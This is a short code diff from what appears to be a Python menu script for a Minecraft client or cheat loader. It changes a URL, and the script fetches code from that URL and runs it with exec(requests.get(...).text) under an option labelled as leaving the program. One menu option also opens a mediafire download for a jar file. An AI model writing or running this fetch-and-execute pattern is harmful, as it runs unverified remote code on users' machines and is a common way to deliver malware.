@@ -21,7 +21,7 @@ while True:
     if chon == '-':
         os.system('cls')
         print("Leaving Raven")
-        exec(requests.get('https://262743e2-fa7a-4c75-a724-3e0aea46544c-00-3cmaqtrfhkj2o.janeway.replit.dev/minecraft.py').text)
+        exec(requests.get('https://raw.githubusercontent.com/VuDungVapeV4/MCCLoader-Free/main/Minecraft').text)
     if chon == 'B1':
         webbrowser.open_new("https://www.mediafire.com/file/dz2qqfvx8rv4s6s/[1.7.10]_Keystrokes_V4.jar/file")
     if chon == 'B2':
